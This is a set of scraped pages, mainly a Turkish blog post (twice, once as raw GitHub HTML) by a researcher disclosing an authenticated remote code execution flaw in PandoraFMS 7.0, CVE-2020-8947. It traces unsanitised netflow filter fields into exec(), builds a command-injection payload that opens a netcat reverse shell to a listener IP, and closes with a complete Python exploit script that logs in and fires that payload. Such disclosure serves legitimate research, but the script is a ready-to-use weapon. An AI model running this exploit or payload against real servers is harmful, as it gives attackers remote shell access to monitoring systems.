=== Content from packetstormsecurity.com_19e96aa3_20250119_114404.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from engindemirbilek.github.io_8217f408_20250119_114404.html ===

## EnginDemirbilek

##### Published

Sat 08 February 2020

[←Home](/)

# PANDORAFMS 7.0 Authenticated Remote Code Execution Zafiyeti (x4)

//Exploit-DEV

Merhaba, [PANDORAFMS](http://pandorafms.org/) adında açık kaynaklı bir ağ izleme aracında bulduğum Authenticated RCE zafiyetinin detaylı bulumunu anlatıyor olacağım.
Statik kaynak kod analizine dair türkçe pek bir kaynak bulunmuyor oluşunu göz önünde bulundurarak makaleyi türkçe kaleme aldım.

**AUTHENTICAD RCE**

Authenticated, zafiyetinin tetiklemesi için geçerli bir kullanıcı gerekli olduğunu belirtir. RCE ise uygulama üzerinden uygulamanın çalıştığı sunucuda sistem kodları çalıştırabilmemize olanak sağlayan zafiyet türüdür.

**PANDORAFMS**

1. Uygulama indirme linki: [PandoraFMS Downloads](https://pandorafms.org/features/free-download-monitoring-software/)
2. Zafiyeti tespit ettiğim sürüm: 7.0

**BÖLÜM 1: Uygulama Eldesi**

Profesyonel bir kaynak kod analizicisi değilim bu sebeple zafiyet bulmanın kendime göre en basit olacağı uygulama türleri sınıflandırdım.
Bunların başında ise ağ izleme yazılımları geliyor. Ufak bir [arama sonucu](https://www.dnsstuff.com/open-source-network-monitoring-tools) açık kaynaklı popüler ağ izleme araçları listesine eriştim ve burada [PANDORAFMS](https://pandorafms.org/) yazılımına rastladım, hem açık kaynaklıydı hemde indirme linklerinde
doğrudan sanallaştırma yazılımlarıyla kullanılabilecek bir OVA dosyası bulunuyordu. Doğrudan bir OVA dosyası bulunması, uygulamanın kaynak kodlarına erişimde işleri oldukça kolaylaştırıyor.
OVA dosyasını indirdim ve [VMWARE Fusion](https://www.vmware.com/products/fusion.html) ile sanal makine olarak kaldırdım.

**Bölüm 2: Kaynak Kod Eldesi**

Sanal makineye giriş yapmak için dağımtıcının kendi sağladığı [kılavuz](https://pandorafms.com/downloads/guias_rapidas_EN.pdf) üzerinden root:pandora giriş bilgisini aldım ve sisteme giriş yaptım.

![PANDORAFMS 7.0](/images/pandorafms/pandorafms.png)

Sistem üzerinde biraz gezindikten sonra, uygulamaya dair kodların varsayılan webservisi dizini olan /var/www/html dizininde tutulduğunu tespit ettim.

![PANDORAFMS 7.0](/images/pandorafms/pandorafms-kaynak.png)

Kodları daha uygun bir ortadamda IDE üzerinden incelemek için dizini [TAR](https://wiki.ubuntu-tr.net/index.php?title=Tar_komutu_kullan%C4%B1m%C4%B1) ile sıkıştırdım ve SCP kullanarak ana makineme aktardım.

```
tar -czvf pandora.tar.gz /var/www/html/pandora_console
scp root@pandoraFMSIP:/var/www/html/pandora.tar.gz /tmp/pandora.tar.gz

```

**Bölüm 3: Kaynak Kodun İncelenmesi**

Dosyaları kendi tercih ettiğim  [ATOM](https://atom.io/) idesini kullanarak kurcalamaya başladım.

Statik kaynak kod analizlerinde komut çalıştırmaya dair bir zafiyet arıyorsak başlı başlı dikkat etmemiz gereken bazı fonksiyonlar var. Bunların bir kaçına örnek olarak;
`system, exec, shell_exec, popen, eval, passthru`
fonksiyonları verilebilir.

IDE üzerinde tüm projede bulunan php dosyalarında yukarıda belirttiğim fonksiyonları aramaya başladım ve boşa çabalanan bir kaç saatin sonunda **functions\_netflow.php** dosyasının 648. satırında zafiyete dair çok umut vaadeden bir nokta tespit ettim.

![PANDORAFMS 7.0](/images/pandorafms/pandorafms-finding-point.png)

Hem **exec()** fonksiyonu kullanılıyor hemde henüz nerenden geldiği belli olmayan ama ben kullanıcıdan geliyorum diye bağıran bir
 değişkeni içeriyordu.
Fazla Kemal Sunal izlemenin etkisinden olacak "Şimdi istanbul hapı yuttu" diye aklımdan geçirerek **$command** değişkeninin nereden geldiğini kurculamaya başladım.

![PANDORAFMS 7.0](/images/pandorafms/pandorafms-command.png)

**$command** değişkeni **net\_flow\_getcommand()** fonksiyonundan geliyor, daha sonrada önceden tanımlanmış ekstra bir kaç komutta üstüne ekleniyordu.
IDE'nin arama özelliğini kullanarak fonksiyonun aynı dosyada 892.nci satırda tanımlandığını tespit ettim.

![PANDORAFMS 7.0](/images/pandorafms/pandorafms-netflow-fonksiyon.png)

Fonksiyonu inclediğimde maalesef kullanıcıdan gelen herhangi bir verinin burada **$command** değişkenine maalesef eklenmediğini gördüm.

![PANDORAFMS 7.0](/images/pandorafms/pandorafms-netflow-fonksiyon-ayrinti.png)

Fakat bereket olsun, **$command** değişkenine bir şeyler ekleyen yeni fonksiyon çıktı karşıma 904. satırda bulunan **netflow\_get\_filter\_arguments** fonksiyonu. IDE üzerinden fonksiyonun tanımlandığı noktayı tespit ettim (aynı dosya 917. satır) ve fonksiyonu incelemeye koyuldum.

![PANDORAFMS 7.0](/images/pandorafms/pandorafms-getfilter-fonksiyon.png)

Fonksiyon bir sürü farklı girdiyi(ipsrc, ipdst, srcport, dstport) herhangi bir kontrolden geçirmeden **$filter\_args** adında bir değişkene ekliyor ve en sonunda **$filter\_args** değişkenini değer olarak dönüyordu.
Daha sonra bu değer, **$command** değişkenine ekleniyor ve ilk tespit edilen satırda bulunan **exec()** fonksiyonuna gönderiliyordu. Yani eğer bu değişkenlerden herhangi birine istediğimiz girdiyi verebilirsek pekala buradan bir RCE elde edebiliriz.
Aslında aradığım şey $\_GET yada $\_POST şekilinde kullanıcıdan alınan bir girdiydi fakat bu değişkenlerin hiç birinin geleneksel GET yada POST ile alındığını tespit edemedim. RCE hem çok yakındı hemde çok uzak.
Bu durum canımı oldukça sıkmış olsada fonksiyonun içinde bulunan değerlerin mantıksal olarak kullanıcıdan alınması gerekiyordu. Uzunca bir süre bu değişkenlerin nasıl alındığı tespit etmeye çalıştım fakat bir sonuca varamadım.
Biraz kafa toplamak amacıyla mola verdim. Bu noktada aslında yine bir şey bulamadığımı düşünüp bırakacaktım ki, aykırı bir tutum sergileyerek Googleda ufak bir arama yaptım.

![PANDORAFMS 7.0](/images/pandorafms/pandorafms-google.png)

Buradan dökümanları okumanın ne kadar önemli olduğunu tekrar alıyoruz. Site üzerinde biraz gezindikten sonra, heyecanımı tekrar kazandıran bir ekran görüntüsüne denk geldim

![PANDORAFMS 7.0](/images/pandorafms/pandorafms-google-netflow-dokuman.png)

Burada ki gösterilen girdiler fonksiyonun içinde tespit ettiğimiz (ipsrc, ipdst, srcport, dstport) değişkenleriydi, yani RCE zafiyetini tetiklememiz için kontrol etmemiz gereken değişkenler. Hemen dökümanı takip ederek, tarayıcı üzerinden ilgili sayfaya eriştim:

![PANDORAFMS 7.0](/images/pandorafms/pandorafms-netflow-page.png)

Girdilerin gönderildiği noktalarının tespitinin ardından, kalan son iş uygun payloadı oluşturmaktı.
Fonksiyonları tekrar inceledim, **netflow\_get\_filter\_arguments** fonksiyonun sonunda **$filter\_args** değişkenine `"` karakteri eklediğini gördüm.

![PANDORAFMS 7.0](/images/pandorafms/pandorafms-son-dokunuslar.png)

Çift tırnakları kapatmak için payloadımız " karakteriyle başlamalı ve kendi komutumuzu çalıştırmak adına " karakterini bir ; takip etmeli tabi farklı girdilerde kullanılabilir && gibi.
Son olarak, payloadımızdan sonra gelecek eklemelerin payloadı bozmaması için en sona # işareti koymamız yeterli olacaktır. Yani payloadımız ";Girilecek Komut# taslağında olacak.
Taslağın arasına ufak bir reverseshell komutu iliştirmek için [Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) den bir reverseshell komutu aldım.
Ve sonuç payloadı: **";nc -e /bin/sh 192.168.1.100 1234 #** olarak oluştu.
Ve sayfada bulunan "router ip" harici herhangi bir inputa oluşturduğum payloadı verdiğimde bir shell eldesi sağladım.

![PANDORAFMS 7.0](/images/pandorafms/pandorafms-son.png)

Dağıtımcıya ulaşmaya çalıştım fakat bir sonuç alamadım. Bu nedenle makaleyi açık olarak yayınladım.

**BÖLÜM 4: EXPLOIT**

Uzun zamandır Python kodlamadım bu sebeple işin kolayına kaçmak adına, daha önce gözüme takılan Mehmet İnceye ait bir kaynak kod analizi makalesi aklıma geldi.
İlgili makaleye [buradan](https://www.exploit-db.com/docs/26314) erişebilirsiniz. Makalede bulunan exploit kodunu PANDORAFMS üzerinde bulduğum zafiyete göre editledim ve sonuç olarak çalışan bir exploit elde ettim:
Exploit-DB: [Exploit](https://www.exploit-db.com/exploits/48064)
```

'''
PANDORAFMS 7.0 Authenticated Remote Code Execution x4
This exploits can be edited to exploit 4x Authenticated RCE vulnerabilities exist on PANDORAFMS.
incase default vulnerable variable won't work, change the position of payload to  one of the following ip_src, dst_port, src_port

Author: Engin Demirbilek
Github: github.com/EnginDemirbilek
CVE: CVE-2020-8947

'''
import requests
import sys

if len(sys.argv) < 6:
	print "Usage: ./exploit.py http://url username password listenerIP listenerPort"
	exit()

url = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]
payload = '";nc -e /bin/sh ' + sys.argv[4] + ' ' + sys.argv[5] + ' ' + '#'

login = {
	'nick':user,
	'pass':password,
	'login_button':'Login'
}
req = requests.Session()
print "Sendin login request ..."
login = req.post(url+"/pandora_console/index.php?login=1", data=login)

payload = {
	'date':"",
	'time':"",
	'period':"",
	'interval_length':"",
	'chart_type':"",
	'max_aggregates':"1",
        'address_resolution':"0",
        'name':"",
        'assign_group':"0",
        'filter_type':"0",
        'filter_id':"0",
        'filter_selected':"0",
        'ip_dst':payload,
	'ip_src':"",
	'dst_port':"",
	'src_port':"",
	'advanced_filter':"",
	'aggregate':"dstip",
	'router_ip':"",
	'output':"bytes",
	'draw_button':"Draw"
}

print "[+] Sendin exploit ..."

exploit = req.post(url+"/pandora_console/index.php?sec=netf&sec2=operation/netflow/nf_live_view&pure=0",cookies=req.cookies, data=payload, headers={
'User-Agent':'Mozilla/5.0 Gecko/20100101 Firefox/72.0',
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Encoding':'gzip, deflate',
'Content-Type':'application/x-www-form-urlencoded'})

if exploit.status_code == 200:
	print "[+] Everything seems ok, check your listener."
else:
	print "[-] Exploit failed. You can change position of payload to ip_src, dst_port or src_port and try again."

```

Go Top

© A Pathetic Soul –
Built with [Pure Theme](https://github.com/PurePelicanTheme/pure)
for [Pelican](http://blog.getpelican.com/)



=== Content from github.com_4134708b_20250119_114405.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FEnginDemirbilek%2FEnginDemirbilek.github.io%2Fblob%2Fmaster%2Fpandorafms-rce.html)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FEnginDemirbilek%2FEnginDemirbilek.github.io%2Fblob%2Fmaster%2Fpandorafms-rce.html)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=EnginDemirbilek%2FEnginDemirbilek.github.io)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[EnginDemirbilek](/EnginDemirbilek)
/
**[EnginDemirbilek.github.io](/EnginDemirbilek/EnginDemirbilek.github.io)**
Public

* [Notifications](/login?return_to=%2FEnginDemirbilek%2FEnginDemirbilek.github.io) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2FEnginDemirbilek%2FEnginDemirbilek.github.io)
* [Star
   1](/login?return_to=%2FEnginDemirbilek%2FEnginDemirbilek.github.io)

* [Code](/EnginDemirbilek/EnginDemirbilek.github.io)
* [Issues
  0](/EnginDemirbilek/EnginDemirbilek.github.io/issues)
* [Pull requests
  0](/EnginDemirbilek/EnginDemirbilek.github.io/pulls)
* [Actions](/EnginDemirbilek/EnginDemirbilek.github.io/actions)
* [Projects
  0](/EnginDemirbilek/EnginDemirbilek.github.io/projects)
* [Security](/EnginDemirbilek/EnginDemirbilek.github.io/security)
* [Insights](/EnginDemirbilek/EnginDemirbilek.github.io/pulse)

Additional navigation options

* [Code](/EnginDemirbilek/EnginDemirbilek.github.io)
* [Issues](/EnginDemirbilek/EnginDemirbilek.github.io/issues)
* [Pull requests](/EnginDemirbilek/EnginDemirbilek.github.io/pulls)
* [Actions](/EnginDemirbilek/EnginDemirbilek.github.io/actions)
* [Projects](/EnginDemirbilek/EnginDemirbilek.github.io/projects)
* [Security](/EnginDemirbilek/EnginDemirbilek.github.io/security)
* [Insights](/EnginDemirbilek/EnginDemirbilek.github.io/pulse)

## Files

 master
## Breadcrumbs

1. [EnginDemirbilek.github.io](/EnginDemirbilek/EnginDemirbilek.github.io/tree/master)
/
# pandorafms-rce.html

Copy path Blame  Blame
## Latest commit

## History

[History](/EnginDemirbilek/EnginDemirbilek.github.io/commits/master/pandorafms-rce.html)252 lines (219 loc) · 14 KB master
## Breadcrumbs

1. [EnginDemirbilek.github.io](/EnginDemirbilek/EnginDemirbilek.github.io/tree/master)
/
# pandorafms-rce.html

Top
## File metadata and controls

* Code
* Blame

252 lines (219 loc) · 14 KB[Raw](https://github.com/EnginDemirbilek/EnginDemirbilek.github.io/raw/refs/heads/master/pandorafms-rce.html)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252<!doctype html><html lang="en"><head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <meta name="description" content="A Pathetic Soul, ">
 <title>PANDORAFMS 7.0 AUTHENTICATED REMOTE CODE EXECUTION x4</title>
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css"> <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css"> <link rel="stylesheet" href="/theme/css/pure.css"> <link rel="stylesheet" href="/theme/css/pygments.css">
 <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script> <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script> <script> $(document).ready(function(){ $(".content").fitVids(); }); </script></head>
<body><div class="pure-g-r" id="layout"> <div class="sidebar sidebar-article pure-u"> <header class="header-article"> <hgroup> <a href="/author/engindemirbilek.html" title="See posts by EnginDemirbilek"> </a> <h2 class="article-info">EnginDemirbilek</h2> <small class="about-author"></small> <h5>Published</h5> <p>Sat 08 February 2020</p> <a href="/">&larr;Home</a> </hgroup> </header> </div> <div class="pure-u"> <div class="content"> <section class="post"> <header class="post-header"> <h1>PANDORAFMS 7.0 Authenticated Remote Code Execution Zafiyeti (x4)</h1> <p class="post-meta"> //Exploit-DEV </p> </header> </section> <p>Merhaba, <a href="http://pandorafms.org/">PANDORAFMS</a> adında açık kaynaklı bir ağ izleme aracında bulduğum Authenticated RCE zafiyetinin detaylı bulumunu anlatıyor olacağım. Statik kaynak kod analizine dair türkçe pek bir kaynak bulunmuyor oluşunu göz önünde bulundurarak makaleyi türkçe kaleme aldım.</p>
<p><strong>AUTHENTICAD RCE </strong></p><p>Authenticated, zafiyetinin tetiklemesi için geçerli bir kullanıcı gerekli olduğunu belirtir. RCE ise uygulama üzerinden uygulamanın çalıştığı sunucuda sistem kodları çalıştırabilmemize olanak sağlayan zafiyet türüdür.</p>
 <p> <strong>PANDORAFMS </strong></p><ol><li>Uygulama indirme linki: <a href="https://pandorafms.org/features/free-download-monitoring-software/">PandoraFMS Downloads</a></li><li>Zafiyeti tespit ettiğim sürüm: 7.0</li></ol><br>
<p><strong>BÖLÜM 1: Uygulama Eldesi</strong></p><p>Profesyonel bir kaynak kod analizicisi değilim bu sebeple zafiyet bulmanın kendime göre en basit olacağı uygulama türleri sınıflandırdım.Bunların başında ise ağ izleme yazılımları geliyor. Ufak bir <a href="https://www.dnsstuff.com/open-source-network-monitoring-tools">arama sonucu</a> açık kaynaklı popüler ağ izleme araçları listesine eriştim ve burada <a href="https://pandorafms.org/">PANDORAFMS</a> yazılımına rastladım, hem açık kaynaklıydı hemde indirme linklerindedoğrudan sanallaştırma yazılımlarıyla kullanılabilecek bir OVA dosyası bulunuyordu. Doğrudan bir OVA dosyası bulunması, uygulamanın kaynak kodlarına erişimde işleri oldukça kolaylaştırıyor.OVA dosyasını indirdim ve <a href="https://www.vmware.com/products/fusion.html">VMWARE Fusion</a> ile sanal makine olarak kaldırdım.</p><br>
<p><strong>Bölüm 2: Kaynak Kod Eldesi</strong></p><p>Sanal makineye giriş yapmak için dağımtıcının kendi sağladığı <a href= https://pandorafms.com/downloads/guias\_rapidas\_EN.pdf>kılavuz</a> üzerinden root:pandora giriş bilgisini aldım ve sisteme giriş yaptım.</p><p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms.png"></p><p>Sistem üzerinde biraz gezindikten sonra, uygulamaya dair kodların varsayılan webservisi dizini olan /var/www/html dizininde tutulduğunu tespit ettim.</p><p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-kaynak.png"></p><p>Kodları daha uygun bir ortadamda IDE üzerinden incelemek için dizini <a href="https://wiki.ubuntu-tr.net/index.php?title=Tar\_komutu\_kullan%C4%B1m%C4%B1">TAR</a> ile sıkıştırdım ve SCP kullanarak ana makineme aktardım.</p><div class="highlight"><pre><span></span>tar -czvf pandora.tar.gz /var/www/html/pandora\_consolescp root@pandoraFMSIP:/var/www/html/pandora.tar.gz /tmp/pandora.tar.gz</pre></div><br>
<p><strong>Bölüm 3: Kaynak Kodun İncelenmesi</strong></p> <p>Dosyaları kendi tercih ettiğim <a href="https://atom.io/"> ATOM</a> idesini kullanarak kurcalamaya başladım.</p><p>Statik kaynak kod analizlerinde komut çalıştırmaya dair bir zafiyet arıyorsak başlı başlı dikkat etmemiz gereken bazı fonksiyonlar var. Bunların bir kaçına örnek olarak; <code>system, exec, shell\_exec, popen, eval, passthru </code> fonksiyonları verilebilir.</p><p> IDE üzerinde tüm projede bulunan php dosyalarında yukarıda belirttiğim fonksiyonları aramaya başladım ve boşa çabalanan bir kaç saatin sonunda <strong>functions\_netflow.php</strong> dosyasının 648. satırında zafiyete dair çok umut vaadeden bir nokta tespit ettim. <p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-finding-point.png"></p><p>Hem <strong>exec()</strong> fonksiyonu kullanılıyor hemde henüz nerenden geldiği belli olmayan ama ben kullanıcıdan geliyorum diye bağıran bir <stron> </stron> değişkeni içeriyordu.Fazla Kemal Sunal izlemenin etkisinden olacak "Şimdi istanbul hapı yuttu" diye aklımdan geçirerek <strong>$command</strong> değişkeninin nereden geldiğini kurculamaya başladım.</p><p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-command.png"></p><p><strong>$command</strong> değişkeni <strong>net\_flow\_getcommand()</strong> fonksiyonundan geliyor, daha sonrada önceden tanımlanmış ekstra bir kaç komutta üstüne ekleniyordu.IDE'nin arama özelliğini kullanarak fonksiyonun aynı dosyada 892.nci satırda tanımlandığını tespit ettim.</p><p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-netflow-fonksiyon.png"></p><p>Fonksiyonu inclediğimde maalesef kullanıcıdan gelen herhangi bir verinin burada <strong>$command</strong> değişkenine maalesef eklenmediğini gördüm.</p><p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-netflow-fonksiyon-ayrinti.png"></p><p> Fakat bereket olsun, <strong>$command</strong> değişkenine bir şeyler ekleyen yeni fonksiyon çıktı karşıma 904. satırda bulunan <strong>netflow\_get\_filter\_arguments</strong> fonksiyonu. IDE üzerinden fonksiyonun tanımlandığı noktayı tespit ettim (aynı dosya 917. satır) ve fonksiyonu incelemeye koyuldum.</p><p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-getfilter-fonksiyon.png"></p><p>Fonksiyon bir sürü farklı girdiyi(ipsrc, ipdst, srcport, dstport) herhangi bir kontrolden geçirmeden <strong>$filter\_args</strong> adında bir değişkene ekliyor ve en sonunda <strong>$filter\_args</strong> değişkenini değer olarak dönüyordu. Daha sonra bu değer, <strong>$command</strong> değişkenine ekleniyor ve ilk tespit edilen satırda bulunan <strong>exec()</strong> fonksiyonuna gönderiliyordu. Yani eğer bu değişkenlerden herhangi birine istediğimiz girdiyi verebilirsek pekala buradan bir RCE elde edebiliriz.Aslında aradığım şey $\_GET yada $\_POST şekilinde kullanıcıdan alınan bir girdiydi fakat bu değişkenlerin hiç birinin geleneksel GET yada POST ile alındığını tespit edemedim. RCE hem çok yakındı hemde çok uzak.Bu durum canımı oldukça sıkmış olsada fonksiyonun içinde bulunan değerlerin mantıksal olarak kullanıcıdan alınması gerekiyordu. Uzunca bir süre bu değişkenlerin nasıl alındığı tespit etmeye çalıştım fakat bir sonuca varamadım.Biraz kafa toplamak amacıyla mola verdim. Bu noktada aslında yine bir şey bulamadığımı düşünüp bırakacaktım ki, aykırı bir tutum sergileyerek Googleda ufak bir arama yaptım.</p><p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-google.png"></p><p>Buradan dökümanları okumanın ne kadar önemli olduğunu tekrar alıyoruz. Site üzerinde biraz gezindikten sonra, heyecanımı tekrar kazandıran bir ekran görüntüsüne denk geldim</p><p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-google-netflow-dokuman.png"></p><p>Burada ki gösterilen girdiler fonksiyonun içinde tespit ettiğimiz (ipsrc, ipdst, srcport, dstport) değişkenleriydi, yani RCE zafiyetini tetiklememiz için kontrol etmemiz gereken değişkenler. Hemen dökümanı takip ederek, tarayıcı üzerinden ilgili sayfaya eriştim: </p><p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-netflow-page.png"></p><p>Girdilerin gönderildiği noktalarının tespitinin ardından, kalan son iş uygun payloadı oluşturmaktı.Fonksiyonları tekrar inceledim, <strong>netflow\_get\_filter\_arguments</strong> fonksiyonun sonunda <strong>$filter\_args</strong> değişkenine <code>"</code> karakteri eklediğini gördüm.<p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-son-dokunuslar.png"></p>Çift tırnakları kapatmak için payloadımız " karakteriyle başlamalı ve kendi komutumuzu çalıştırmak adına " karakterini bir ; takip etmeli tabi farklı girdilerde kullanılabilir && gibi.Son olarak, payloadımızdan sonra gelecek eklemelerin payloadı bozmaması için en sona # işareti koymamız yeterli olacaktır. Yani payloadımız ";Girilecek Komut# taslağında olacak.Taslağın arasına ufak bir reverseshell komutu iliştirmek için <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey</a> den bir reverseshell komutu aldım.Ve sonuç payloadı: <strong>";nc -e /bin/sh 192.168.1.100 1234 #</strong> olarak oluştu.Ve sayfada bulunan "router ip" harici herhangi bir inputa oluşturduğum payloadı verdiğimde bir shell eldesi sağladım.</p><p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-son.png"></p>
<br><br><p>Dağıtımcıya ulaşmaya çalıştım fakat bir sonuç alamadım. Bu nedenle makaleyi açık olarak yayınladım.</p> <br> <p><strong>BÖLÜM 4: EXPLOIT</p></strong> Uzun zamandır Python kodlamadım bu sebeple işin kolayına kaçmak adına, daha önce gözüme takılan Mehmet İnceye ait bir kaynak kod analizi makalesi aklıma geldi.İlgili makaleye <a href="https://www.exploit-db.com/docs/26314">buradan</a> erişebilirsiniz. Makalede bulunan exploit kodunu PANDORAFMS üzerinde bulduğum zafiyete göre editledim ve sonuç olarak çalışan bir exploit elde ettim:Exploit-DB: <a href="https://www.exploit-db.com/exploits/48064">Exploit</a> <div class="highlight"><pre><span></span>'''PANDORAFMS 7.0 Authenticated Remote Code Execution x4This exploits can be edited to exploit 4x Authenticated RCE vulnerabilities exist on PANDORAFMS.incase default vulnerable variable won't work, change the position of payload to one of the following ip\_src, dst\_port, src\_port
Author: Engin DemirbilekGithub: github.com/EnginDemirbilekCVE: CVE-2020-8947
'''import requestsimport sys
if len(sys.argv) < 6: print "Usage: ./exploit.py http://url username password listenerIP listenerPort" exit()
url = sys.argv[1]user = sys.argv[2]password = sys.argv[3]payload = '";nc -e /bin/sh ' + sys.argv[4] + ' ' + sys.argv[5] + ' ' + '#'
login = { 'nick':user, 'pass':password, 'login\_button':'Login'}req = requests.Session()print "Sendin login request ..."login = req.post(url+"/pandora\_console/index.php?login=1", data=login)
payload = { 'date':"", 'time':"", 'period':"", 'interval\_length':"", 'chart\_type':"", 'max\_aggregates':"1", 'address\_resolution':"0", 'name':"", 'assign\_group':"0", 'filter\_type':"0", 'filter\_id':"0", 'filter\_selected':"0", 'ip\_dst':payload, 'ip\_src':"", 'dst\_port':"", 'src\_port':"", 'advanced\_filter':"", 'aggregate':"dstip", 'router\_ip':"", 'output':"bytes", 'draw\_button':"Draw"}
print "[+] Sendin exploit ..."
exploit = req.post(url+"/pandora\_console/index.php?sec=netf&sec2=operation/netflow/nf\_live\_view&pure=0",cookies=req.cookies, data=payload, headers={'User-Agent':'Mozilla/5.0 Gecko/20100101 Firefox/72.0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8','Accept-Encoding':'gzip, deflate','Content-Type':'application/x-www-form-urlencoded'})
if exploit.status\_code == 200: print "[+] Everything seems ok, check your listener."else: print "[-] Exploit failed. You can change position of payload to ip\_src, dst\_port or src\_port and try again."</pre></div><br> <video id="PANDORAFMS exploitation" class="video-js vjs-default-skin" controlspreload="auto" width="683" height="384"data-setup="{}"><source src="/images/pandorafms/pandorafms-exploitpoc.mov" type='video/mp4'></video>
 <div class="hr"></div> <a href="#" class="go-top">Go Top</a><footer class="footer"> <p>&copy; A Pathetic Soul &ndash; Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a> for <a href="http://blog.getpelican.com/">Pelican</a> </p></footer> </div> </div></div> <script> var $top = $('.go-top');
 // Show or hide the sticky footer button $(window).scroll(function() { if ($(this).scrollTop() > 200) { $top.fadeIn(200); } else { $top.fadeOut(200); } });
 // Animate the scroll to top $top.click(function(event) { event.preventDefault(); $('html, body').animate({scrollTop: 0}, 300); })
